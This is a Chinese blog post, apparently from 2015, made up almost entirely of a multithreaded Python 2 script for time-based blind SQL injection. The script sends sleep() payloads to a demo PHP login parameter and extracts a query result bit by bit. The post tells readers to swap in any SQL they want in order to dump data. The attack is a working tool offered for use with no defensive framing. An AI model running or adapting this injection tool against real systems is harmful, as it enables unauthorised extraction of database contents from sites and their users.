<h1 id="title">python延迟注入</h1>
<time id="date" datetime="2015-09-13T17:20:22+08:00">2015-09-13 17:20</time>
<section id="content">
    <p>
        如果要爆数据啥的话就改py代码里面的select%20user()，替换为你要执行的sql即可<br />[cc
        lang=”python”]<br />#!/usr/bin/env python<br /># -*- coding: utf-8
        -*-<br /># 延迟注入工具<br />import urllib2<br />import time<br />import
        socket<br />import threading<br />import requests
    </p>
    <p>
        class my_threading(threading.Thread):<br />def __init__(self, str,x):<br />threading.Thread.__init__(self)<br />self.str
        = str<br />self.x = x<br />def run(self):<br />global res<br />x=self.x<br />j
        = self.str<br />url =
        “http://localhost/demo/1.php?username=root’+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,”
        + str(x) + “,1%29%29%29,8,0%29,”+ str(j) +
        “,1%29%29,sleep%282%29,0%29%23″<br />html = request(url)<br />verify =
        ‘timeout’<br />if verify not in html:<br />res[str(j)] = 0<br />#print
        1<br />else:<br />res[str(j)] = 1
    </p>
    <p>
        def request(URL):<br />user_agent = { ‘User-Agent’ : ‘Mozilla/5.0
        (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like
        Gecko) Version/5.1.3 Safari/534.53.10’ }<br />req = urllib2.Request(URL,
        None, user_agent)<br />try:<br />request =
        urllib2.urlopen(req,timeout=2)<br />except Exception ,e:<br />time.sleep(2)<br />return
        ‘timeout’<br />return request.read()
    </p>
    <p>
        def curl(url):<br />try:<br />start = time.clock()<br />requests.get(url)<br />end
        = time.clock()<br />return int(end)<br />except
        requests.RequestException as e:<br />print u”访问出错!”<br />exit()<br />def
        getLength():<br />i = 0<br />while True:<br />print “[+] Checking: %s
        \r” %i<br />url =
        “http://localhost/demo/1.php?username=root’+and+sleep(if(length((select%20user()))=”+
        str(i) +”,1,0))%23″<br />html = request(url)<br />verify = ‘timeout’<br />if
        verify in html:<br />print u”[+] 数据长度为： %s” %i<br />return i
    </p>
    <p>
        i = i + 1<br />def bin2dec(string_num):<br />return int(string_num, 2)
    </p>
    <p>
        def getData(dataLength):<br />global res<br />data = “”<br />for x in
        range(dataLength):<br />x = x + 1<br />#print x<br />threads = []<br />for
        j in range(8):<br />result = “”<br />j = j + 1<br />sb =
        my_threading(j,x)<br />sb.setDaemon(True)<br />threads.append(sb)<br />#print
        j<br />for t in threads:<br />t.start()<br />for t in threads:<br />t.join()<br />#print
        res<br />tmp = “”<br />for i in range(8):<br />tmp = tmp +
        str(res[str(i+1)])<br />#print chr(bin2dec(tmp))<br />res = {}<br />result
        = chr(bin2dec(tmp))<br />print result<br />data = data + result<br />sb
        = None<br />print “[+] ok!”<br />print “[+] result:” + data
    </p>
    <p>
        if __name__ == ‘__main__’:<br />stop = False<br />res = {}<br />length =
        getLength()<br />getData(length)<br />[/cc]<br />1.php<br />[cc
        lang=”php”]<br /><br />[/cc]
    </p>
    <div class="entry-copyright">
        <p>
            原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/security/python-delayed-injection-vulnerability.html
        </p>
    </div>
</section>
